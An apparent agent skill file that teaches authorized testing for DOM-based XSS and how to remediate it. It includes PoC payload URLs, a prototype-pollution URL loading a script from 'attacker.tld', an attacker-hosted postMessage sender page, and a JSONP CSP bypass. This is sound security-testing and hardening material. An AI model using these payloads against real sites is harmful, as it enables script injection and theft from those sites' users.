---
name: xss-dom
description: DOM-based XSS - source/sink analysis with DOM Invader, prototype pollution gadget hunting, postMessage handlers, framework escape hatches, and Trusted Types hardening
---

# DOM-Based Cross-Site Scripting (DOM XSS)

DOM XSS differs from reflected and stored XSS in one decisive way: the payload never reaches the server. Untrusted data is read from a client-side **source** (a browser API), passed through JavaScript, and written into a dangerous **sink** (an API that executes or parses markup) entirely inside the victim's browser. Server logs, WAF rules, and server-side scanners are blind to the entire chain, so exploitation is proven in the browser, not in Burp's HTTP history.

## When to use this skill

- The target ships a heavy client-side bundle (SPA, dashboard, embedded widget, marketing page with analytics) and you need to audit the front end for injection.
- You observe JavaScript parsing URL fragments (`location.hash`), `postMessage` traffic, or storage APIs, and no corresponding server-side parameter exists.
- A strict CSP is deployed and you must determine whether client-side sinks, JSONP endpoints, or script gadgets defeat it.
- A server reflects your payload but no alert fires — check whether a DOM sink consumes the reflected value after transformation (encoding, truncation, or JSON wrapping).
- You are hardening an application with Trusted Types or DOMPurify and need a complete source→sink inventory to prove coverage.
- You found a client-side prototype pollution primitive and need to escalate it into script execution via a gadget.
- Scope note: only test applications you are explicitly authorized to test; DOM payloads execute in real user browsers, so during triage use non-destructive proof (`console.trace`, benign `alert(1)` in a lab tenant) and never chain toward exfiltration or persistence.
- Prerequisites: Burp Suite Pro with the embedded browser (DOM Invader) or Chrome/Edge DevTools, basic JavaScript reading fluency, and unminified bundles or source maps whenever they are available.

## Sources & Sinks Architecture

A DOM XSS vulnerability exists when attacker-controlled data flows from a **source** into a **sink** without validation or safe encoding. Map both sides first; the exploit is simply the shortest path between them.

### Source inventory (attacker-controllable data entry points)

Grep every loaded script for these identifiers before touching payloads — each one is a potential start of the taint path.

| Source | Attacker control | Notes |
| --- | --- | --- |
| `location.hash` | Full control of everything after `#` | Never sent to the server; ideal for stealth payloads and survives redirects that preserve the fragment. |
| `location.search` | Full control of the query string | Reflected through the server too, so it may double as a reflected-XSS source. |
| `location.href` / `document.URL` / `document.documentURI` | Full URL including fragment | Often substring-parsed by hand-rolled routers; `documentURI` reflects the *decoded* URL in some browsers. |
| `location.pathname` | Path segments | Consumed by client-side routers (`#/user/:id`) and by code that splits on `/`. |
| `window.name` | Arbitrary string set by any page that opened/named the window | Persists across navigations within the same tab; classic cross-tab delivery channel. |
| `document.referrer` | Full referrer URL when the victim clicks an attacker link | Flows into analytics widgets and "back" buttons that render it. |
| `postMessage` `event.data` | Any serializable payload from any frame that can post | Dangerous when the handler never checks `event.origin` / `event.source`. |
| `localStorage` / `sessionStorage` | Any value a prior page stored from user input | Turns DOM XSS into *stored* DOM XSS; localStorage is shared across all tabs of the origin. |
| `sessionStorage` across tabs | Per-tab, but shared with same-origin iframes inside that tab | Survives reloads and (in most browsers) tab restore, so a poisoned value re-fires after navigation. |
| `document.cookie` | Any non-HttpOnly cookie | Feeds client-side feature flags and A/B tests that are later interpolated into HTML. |
| `URLSearchParams` / `URL` parsing results | Derived from query/hash | The parsed object itself becomes the taint carrier. |
| History API state (`history.state`, popstate payloads) | Settable via crafted navigation flows | Rare but real in state-restoration code. |

```javascript
// window.name persistence across navigations — attacker page:
const w = window.open('https://target.tld/victim-page');
w.name = '<img src=x onerror=alert(1)>';   // set BEFORE the target finishes loading
w.location = 'https://target.tld/page-with-sink'; // name survives the navigation
// Modern browsers increasingly clear window.name on cross-site navigations,
// but same-site navigations and tab reuse still carry it — always test both.
```

```javascript
// localStorage as a stored-DOM-XSS channel:
// 1) Page A stores user input:  localStorage.setItem('profileName', location.hash.slice(1));
// 2) Page B renders it later:   el.innerHTML = localStorage.getItem('profileName');
// Poison once via any input-accepting page of the origin, then trigger the sink anywhere.
```

### Sink inventory with danger ratings

Rate each sink by how directly it executes attacker markup or script.

| Rating | Sink | Why it is dangerous |
| --- | --- | --- |
| CRITICAL | `element.innerHTML = x` | Parses attacker markup; `<img onerror>` executes without user interaction. |
| CRITICAL | `element.outerHTML = x` | Same parser risk; also replaces the live node. |
| CRITICAL | `element.insertAdjacentHTML(pos, x)` | Identical parser risk at any insertion position. |
| CRITICAL | `document.write(ln)(x)` | Raw parser write; after page load it nukes the document. |
| CRITICAL | `eval(x)` | Direct script execution. |
| CRITICAL | `setTimeout(x)` / `setInterval(x)` with string first arg | String form compiles and executes as script. |
| CRITICAL | `new Function(x)()` | Direct script execution via the Function constructor. |
| CRITICAL | `location = x` / `location.href = x` / `location.assign(x)` with `javascript:` URI | Script-initiated navigation to a `javascript:` URL executes in the page context. |
| CRITICAL | `script.src = x` / dynamic `<script>` creation | Loads arbitrary external script. |
| CRITICAL | jQuery `$()` constructor with HTML string | Parses markup AND evals embedded `<script>` blocks via `domManip`. |
| CRITICAL | jQuery `.html(x)` / `.append(x)` / `.prepend(x)` / `.after(x)` / `.before(x)` / `.wrap(x)` | Same parse + script-eval behavior as `$()`. |
| CRITICAL | AngularJS `$compile(x)` / `$sce.trustAsHtml(x)` on user data | Bypasses all AngularJS interpolation protections. |
| CRITICAL | React `dangerouslySetInnerHTML={{__html: x}}` | Explicit opt-out of React's escaping. |
| CRITICAL | Vue `v-html="x"` | Renders raw HTML, no sanitization. |
| CRITICAL | Angular `[innerHTML]="sanitizer.bypassSecurityTrustHtml(x)"` | Explicit sanitizer bypass. |
| HIGH | `.attr('href', x)` / `.attr('src', x)` (jQuery) or `setAttribute('href'/'src', x)` | `javascript:` scheme yields XSS on click/load; also enables tabnabbing via `target`. |
| HIGH | `setAttribute('on' + eventName, x)` or any inline event attribute assignment | Direct handler injection. |
| HIGH | `iframe.srcdoc = x` | Full document under the parent origin's policy. |
| HIGH | `form.action = x` / `element.dataset.*` later read into a sink | Deferred injection; trace where the value is consumed. |
| HIGH | `jQuery.globalEval(x)` / `$.parseHTML(x, true)` (keepScripts) | Explicit script execution. |
| MEDIUM | `element.style.cssText = x` / CSS sinks (`background-image: url(...)`) | Exfiltration and UI redress; rarely direct XSS. |
| MEDIUM | `window.open(x)` / `element.src = x` on non-script resources | Navigation hijack; `javascript:` is blocked in modern `window.open` but legacy WebViews vary. |
| MEDIUM | `location.search`/`hash` re-serialized into server requests | May convert DOM XSS into a server-reflected chain. |
| SAFE | `textContent`, `innerText`, `createTextNode`, `classList.add`, validated `style.setProperty` | These are the remediation targets, not sinks. |

```javascript
// Sink examples worth grepping for in bundles:
el.innerHTML = params.msg;                       // CRITICAL
document.write('<div>' + location.hash + '</div>'); // CRITICAL
setTimeout('handle("' + userInput + '")');       // CRITICAL (string form)
new Function('return ' + jsonBlob)();            // CRITICAL
location.href = urlFromReferrer;                 // CRITICAL if javascript: reachable
$('#result').html(ajaxResponse);                 // CRITICAL
$('<div>' + userValue + '</div>').appendTo('body'); // CRITICAL
a.setAttribute('href', nextUrl);                 // HIGH (javascript: scheme)
$compile('<div>' + $routeParams.q + '</div>')($scope); // CRITICAL (AngularJS)
```

## Methodology & Triage

Run triage in this order: enumerate sources → enumerate sinks → automate with DOM Invader → confirm manually with a minimal PoC → escalate exotic chains (prototype pollution, postMessage, framework bypasses) → assess CSP interaction.

### DOM Invader workflow (canary injection, sink tracing, hash-driven testing)

1. Open the target in Burp's embedded browser (built into Burp Suite Pro since 2020.x) and confirm the DOM Invader extension is enabled in the browser's extension panel.
2. Set a distinctive canary string in DOM Invader settings (e.g. `c4n4ry123`) so you can grep for it unambiguously in console output.
3. Browse the application normally. DOM Invader injects the canary into every source it detects (query params, hash, postMessage, storage) and highlights every sink that consumed it.
4. Click a highlighted sink to open the stack trace panel: it shows the exact source→sink path, including intermediate transformations, which is your exploitation recipe.
5. Use the **Attack surface** tab to enumerate all discovered URL parameters and hash parameters in one place, then let DOM Invader auto-fuzz them — it substitutes the canary into each parameter individually and reports which ones reach a sink.
6. For hash-driven testing, edit the hash directly in the Attack surface tab (or in the URL bar) and re-run: DOM Invader re-injects the canary into the modified fragment so you can iterate on fragment payloads without server round-trips.
7. Enable postMessage fuzzing in settings so DOM Invader discovers registered `message` listeners and lets you send crafted messages from its UI instead of hand-writing an iframe sender page.
8. Use the **Prototype pollution** tab: DOM Invader automatically probes for client-side PP primitives and, when one is found, attempts known gadget exploitation for you — treat its findings as leads and confirm manually.
9. Export every confirmed source→sink pair into your notes with the exact URL, the sink line (from the stack trace), and the canary variant that reached it; this becomes the manual confirmation checklist.

### Manual confirmation flow with minimal PoC URLs

1. Reproduce the sink path in DevTools: search all sources (`Ctrl/Cmd+Shift+F`) for the sink identifier, set a breakpoint on the assignment line, and reload with your canary in the suspected source.
2. Verify at the breakpoint that the variable being assigned contains your raw canary (not HTML-encoded, not truncated).
3. Replace the canary with a minimal execution payload and reload — no server involvement means you can iterate purely on the URL.
4. Prefer interaction-free payloads (`<img src=x onerror=...>`, `<svg onload=...>`) over click-based ones so the PoC is unambiguous.
5. Encode payloads for their transport: inside `location.hash` most characters survive verbatim, but if the app splits the fragment on `/` and `=` (a common hash-parameter convention), encode literal delimiters as `%2F` and `%3D` inside values.

```text
# Direct hash payload into an innerHTML sink:
https://target.tld/page#<img src=x onerror=alert(1)>

# Hash-parameter convention: app parses fragment as key/value pairs split on "/" and "="
# and maps them onto element attributes, so this sets img[src] to "onerror=alert(1)"-style data:
https://target.tld/page#img_src/onerror=alert(1)

# Query-string variant when the sink reads location.search:
https://target.tld/page?name=<svg onload=alert(1)>

# window.name delivery (payload set by attacker page before navigation):
https://target.tld/sink-page   <- reached with w.name preloaded
```

6. Confirm execution in the console (`alert(1)` fires or your marker logs), screenshot it, and record the minimal URL as the PoC — a PoC that requires explanation is not a PoC.
7. If the sink encodes input, work backwards from the encoding: find which characters survive (`<`, `"`, `'`, backtick, `/`) and craft a payload using only survivors.

### Client-side prototype pollution → XSS gadget chain

Client-side prototype pollution (PP) lets you define properties on `Object.prototype` from a URL; a **gadget** is application code that reads such a property into a sink. The chain is: pollute → gadget reads polluted key → sink executes.

1. **Detect the pollution primitive.** Submit `?__proto__[ppprobe]=ppprobe` (and the bracket-less variant `?__proto__%5Bppprobe%5D=ppprobe`) and check in the console whether `({}).ppprobe === 'ppprobe'`. Also try nested forms and the `constructor[prototype]` alias when `__proto__` is filtered.
2. **Identify the merge gadget that enables pollution.** Grep bundles for deep-merge patterns that copy user objects without key filtering: `Object.assign(`, `_.merge(`, `jQuery.extend(true,`, `deepMerge(`, `deparam(`, custom `for (k in obj)` loops, and query-string parsers (`qs`, `query-string`, hand-rolled parsers) whose output is merged into a config object.
3. **Hunt for an XSS gadget.** Once pollution works, you need code that reads an arbitrary property from a plain object and feeds it to a sink. Systematically search for property reads on config-like objects followed by sinks: `config.src`, `opts.innerHTML`, `settings.template`, `params.callback`, `options.url`.
4. **Use known gadget lists as a starting point**, then verify against the target's actual bundle. Well-documented gadget families from client-side PP research include:
   - Libraries whose config accepts a script/image URL: pollute `__proto__[src]` or `__proto__[url]` when the app later does `script.src = cfg.src` or `new Image().src = cfg.url`.
   - Template/config renderers: pollute `__proto__[innerHTML]` or `__proto__[template]` when app code renders `el.innerHTML = cfg.template`.
   - JSONP-style loaders: pollute `__proto__[callback]` when app code builds `<script src="...?callback=' + cfg.callback + '">`.
   - jQuery-deparam / deparam-style parsers: pollute keys that flow into `$()` HTML construction.
   - Analytics/widget configs (`analytics.js`, chat widgets, A/B tools): pollute documented config keys (`cookieDomain`, `endpoint`, `logUrl`) that are concatenated into URLs or markup.
5. **Automate discovery**: run DOM Invader's Prototype pollution tab (it detects the primitive and tries known gadgets), and use community scanners such as `ppmap` to fingerprint gadget-bearing bundles across your target's JS inventory.
6. **Exploit step-by-step**:
   - Confirm pollution: `?__proto__[ppprobe]=ppprobe` → console shows `({}).ppprobe`.
   - Pick the gadget property from step 3/4 (say the bundle contains `s.src = cfg.src`).
   - Pollute it: `?__proto__[src]=data:text/javascript,alert(1)` or an attacker-hosted script URL.
   - Trigger the code path that reads `cfg.src` (usually a page load or widget init) and confirm execution.

```text
# Detection + exploitation sequence for a script-src gadget:
https://target.tld/?__proto__[ppprobe]=ppprobe
https://target.tld/?__proto__[src]=//attacker.tld/x.js
https://target.tld/?__proto__[innerHTML]=<img src=x onerror=alert(1)>
https://target.tld/?constructor[prototype][innerHTML]=<img src=x onerror=alert(1)>
```

7. **Fix-awareness note**: libraries fixed their own merge functions long ago, but application glue often re-implements them — pollution via *application* code survives library upgrades, so always test the glue layer too.

### postMessage handlers lacking origin validation

A handler that consumes `event.data` without checking `event.origin` (and ideally `event.source`) lets any website — including one inside an iframe on the victim's browser — inject into the sink.

```javascript
// Vulnerable handler pattern (target page):
window.addEventListener('message', (e) => {
  document.getElementById('preview').innerHTML = e.data; // no origin check -> DOM XSS
});
```

Build a minimal sender page to confirm:

```html
<!-- attacker.tld/send.html -->
<iframe src="https://target.tld/page-with-handler" id="f"></iframe>
<script>
  const f = document.getElementById('f');
  f.onload = () => {
    // '*' means "don't care about the receiving origin" — fine for a PoC,
    // because the vulnerable target never validates anyway.
    f.contentWindow.postMessage('<img src=x onerror=alert(1)>', '*');
  };
</script>
```

1. Host the sender page anywhere you control (or use `data:text/html,<...>` via a local file) and open it in the same browser profile.
2. Confirm the alert fires inside the target's origin — DevTools will show the executing frame's origin in the console context selector.
3. If the handler validates origin but not message shape, test allowlist weaknesses: sibling subdomains (`*.target.tld`), origins reachable via open redirect, and `null` origin (sandboxed iframe senders pass `event.origin === 'null'` checks written as falsy comparisons).
4. If data is JSON (`JSON.parse(e.data)`), pollute/override fields that later reach sinks — same gadget logic as prototype pollution but delivered postMessage.

### Framework escape hatches

Frameworks escape by default; every XSS path runs through an explicit developer opt-out. Find the opt-outs and check whether user data reaches them.

- **React**: `dangerouslySetInnerHTML={{__html: userInput}}` is a full bypass. Also audit any component that builds HTML strings for it, and props like `href`/`src` receiving `javascript:` URIs (React does not block scheme-based XSS in plain attributes).
- **Vue**: `v-html="userInput"` renders raw HTML with no sanitization; audit computed properties feeding it.
- **Angular (2+)**: `[innerHTML]="x"` is sanitized by default via `DomSanitizer`. The bypass patterns to hunt are: `sanitizer.bypassSecurityTrustHtml(userInput)`, `bypassSecurityTrustResourceUrl`, and pipes/directives that wrap user data in a bypass call. Also test template injection when user input reaches template compilation (`{{constructor.constructor('alert(1)')()}}`).
- **AngularJS (1.x)**: `$compile(userInput)` and `$sce.trustAsHtml(userInput)` are full bypasses; ng-bind-html without $sce strictness on legacy versions is also exploitable.

```javascript
// React bypass pattern to grep for:
<div dangerouslySetInnerHTML={{__html: this.props.comment}} />
// Vue bypass pattern:
<div v-html="userBio"></div>
// Angular bypass pattern:
this.trusted = this.sanitizer.bypassSecurityTrustHtml(rawComment); // then [innerHTML]="trusted"
```

### mXSS edge cases (innerHTML round-trip mutation)

Mutation XSS exploits asymmetry between the HTML parser and the serializer: reading `.innerHTML` and writing it back can *mutate* markup into an executable form, defeating sanitizers that validated the original string.

- Classic round-trip family: `<noscript>`, `<template>`, `<svg><style>`, and `<math>` namespaces parse differently depending on scripting/namespace context, so a sanitized-looking string can deserialize into executable markup.
- Illustrative shape (behavior varies by browser version — always test live):

```html
<div id="v"><noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript></div>
<script>
  const v = document.getElementById('v');
  v.innerHTML = v.innerHTML; // round-trip mutates the payload into executable markup
</script>
```

- Practical implication: if you control content that passes through sanitize → store → re-render cycles, test whether re-rendering re-parses differently; historical DOMPurify bypasses were almost all mXSS of this family.

### CSP interaction: JSONP escape hatches and script gadgets

- **JSONP endpoints as script-src escape hatches**: if the CSP allowlists an origin that hosts a JSONP-style endpoint with an attacker-controlled callback, you can load it as a script and execute arbitrary JS despite the policy.

```html
<!-- CSP allows https://cdn.trusted.tld; that origin exposes: -->
<script src="https://cdn.trusted.tld/jsonp?callback=alert(1)//"></script>
<!-- Response body: alert(1)//({"data":...});  -> executes under target's CSP -->
```

- Enumerate allowlisted origins for JSONP/open-redirect/script-hosting behavior before declaring a CSP effective; a single permissive origin can invalidate the whole policy.
- **Script gadgets vs `strict-dynamic`**: `strict-dynamic` trusts scripts *created by* already-trusted scripts. Gadget libraries (old jQuery `$()`/`.html()` re-creating script elements via `domManip`, Dojo, Prototype.js-style helpers) let you inject markup that the trusted library turns into a script element — the trust chain propagates and your script executes even under strict-dynamic.
- Corollary: CSP strength depends on library hygiene. A strict CSP with a legacy jQuery bundle loaded from an allowlisted CDN is weaker than it looks.
- Also check: missing `base-uri 'none'` (relative script hijack), missing `object-src 'none'`, and `unsafe-eval` (revives string-form `setTimeout`, `new Function`, and template engines that compile to eval).

### Tooling

- **Burp DOM Invader**: primary automation for source→sink tracing, canary injection, hash/query fuzzing, postMessage fuzzing, and client-side PP detection; run everything through Burp's embedded browser so results are reproducible.
- **Chrome DevTools breakpoints on sinks**: Sources → Event Listener Breakpoints → Script → *Script First Statement* catches `eval`/`new Function`/string-`setTimeout` execution; in the Elements panel right-click a node → *Break on* → subtree/attribute modifications to freeze execution exactly when an HTML sink fires; use global search (`Ctrl/Cmd+Shift+F`) plus source maps to set line breakpoints on sink assignments found by grep.
- **semgrep client-side rules**: codify sink patterns for CI and bulk audits.

```yaml
rules:
  - id: dom-xss-innerhtml-from-location
    mode: taint
    pattern-sources:
      - pattern: location.hash
      - pattern: location.search
      - pattern: $E.data   # postMessage handler context
    pattern-sinks:
      - pattern: $EL.innerHTML = $X
      - pattern: document.write($X)
    message: Untrusted client-side data flows into an HTML sink
    severity: ERROR
```

- **RetireJS / library detection**: run RetireJS (CLI or browser extension) against every bundled script to flag vulnerable versions — notably jQuery `< 3.5.0`, where `$()`/`.html()`/`.parseHTML()` suffer mXSS-based XSS (CVE-2020-11022 / CVE-2020-11023) even against sanitized input.
- **Bundle reconnaissance**: use source maps (`*.map`) when exposed, LinkFinder-style endpoint extraction from JS files, and grep for sink/source identifiers to build the taint inventory quickly.

## Remediation

1. **Prefer text APIs over HTML sinks**: use `element.textContent` / `createTextNode` instead of `innerHTML`; reserve HTML rendering for genuinely static templates. For URLs, validate scheme explicitly before assignment:

```javascript
function safeUrl(input) {
  const u = new URL(input, location.origin);
  if (!['http:', 'https:', 'mailto:'].includes(u.protocol)) return null;
  return u.href;
}
el.href = safeUrl(userInput) ?? '#';
```

2. **Sanitize with DOMPurify when HTML is unavoidable**, with an explicit locked-down profile rather than defaults:

```javascript
const clean = DOMPurify.sanitize(dirty, {
  USE_PROFILES: { html: true },          // drop svg/mathml unless truly needed
  ALLOWED_ATTR: ['href', 'src', 'alt', 'title'],
  FORBID_TAGS: ['style', 'form', 'input'],
  FORBID_ATTR: ['style'],
  RETURN_TRUSTED_TYPE: true              // required when Trusted Types is enforced
});
el.innerHTML = clean;
```

3. **Enforce Trusted Types** to make unsafe sinks fail closed at runtime:

```http
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types dompurify angular default;
```

```javascript
// Policy example: route all HTML writes through DOMPurify
trustedTypes.createPolicy('dompurify', {
  createHTML: (s) => DOMPurify.sanitize(s, { RETURN_TRUSTED_TYPE: true }),
  createScriptURL: (s) => {
    const u = new URL(s, location.origin);
    if (u.origin !== location.origin) throw new Error('blocked');
    return u.href;
  }
});
// Roll out with Content-Security-Policy-Report-Only first, then enforce.
```

4. **Validate postMessage senders** with an explicit origin allowlist and schema-checked payloads:

```javascript
const ALLOWED_ORIGINS = new Set(['https://app.target.tld']);
window.addEventListener('message', (e) => {
  if (!ALLOWED_ORIGINS.has(e.origin)) return;      // reject everything else, incl. 'null'
  if (typeof e.data !== 'string' || e.data.length > 4096) return;
  render(e.data);                                   // render() must itself be sink-safe
});
```

5. **Deploy a nonce-based CSP** with strict-dynamic and no eval escape hatches:

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'nonce-R4ND0M-PER-RESPONSE' 'strict-dynamic';
  object-src 'none'; base-uri 'none';
  report-uri /csp-report;
```

Generate a fresh nonce per response server-side, never reuse it across responses or derive it predictably; remove JSONP endpoints from allowlisted origins because they function as arbitrary-script loaders; avoid `'unsafe-inline'`/`'unsafe-eval'` entirely (CSP3 browsers ignore `'unsafe-inline'` when a nonce is present anyway).

6. **Kill prototype pollution at the source**: upgrade `qs`, `lodash`, and jQuery to patched versions; validate merge keys against `__proto__`, `constructor`, and `prototype`; build config objects with `Object.create(null)`; freeze critical singletons where feasible.
7. **Fix framework opt-outs**: replace `dangerouslySetInnerHTML`/`v-html`/bypass calls with safe components; where HTML is required, pass it through DOMPurify before it reaches the escape hatch.
8. **Verify remediation**: re-run DOM Invader against every previously vulnerable URL, confirm sinks now receive trusted types or sanitized strings, confirm the CSP reports no violations in staging, and add regression tests that assert polluted properties (`({}).innerHTML`) cannot influence rendered output — a fix without a re-test is an assumption, not a fix.

## Verification & Deliverables
A complete engagement run of this skill produces:
- Source→sink trace: the exact URL parameter/hash/postMessage reaching the dangerous sink, from DOM Invarker or manual instrumentation.
- Minimal PoC URL that executes JavaScript on page load in a clean browser profile.
- Prototype-pollution gadget chain proof (if applicable): pollution payload + gadget sink execution.
- postMessage handler PoC with origin validation absent.
- CSP/JSONP analysis and framework escape-hatch findings.
- Remediation: safe sink APIs (textContent), allowlisted postMessage origins, pollution-resistant object creation — re-tested.
If any artifact is missing, the test is incomplete — return to the corresponding methodology step.
